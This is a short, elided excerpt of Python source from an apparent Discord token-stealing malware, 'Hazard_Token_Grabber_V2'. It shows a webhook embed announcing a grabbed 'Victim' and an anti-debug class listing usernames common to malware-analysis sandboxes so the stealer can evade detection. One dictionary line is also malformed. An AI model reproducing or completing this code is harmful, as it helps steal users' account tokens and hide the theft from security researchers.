...
class Hazard_Token_Grabber_V2(functions):
    ...
    def finish(self):
        ...
        embed = {
            'username'
            'avatar_url': 'https://cdn.discordapp.com/attachments/924550425712136222/970412790667943946/LERRi.png',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Foi grabado pelos cria',
                        'url': 'https://discord.gg/',
                        'icon_url': 'https://cdn.discordapp.com/attachments/924550425712136222/970412790667943946/LERRi.png'
                    },
                    'color': 16119101,
...
class AntiDebug(functions):
    ...
    def __init__(self):
        ...
        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "Europeu", "europeu"]
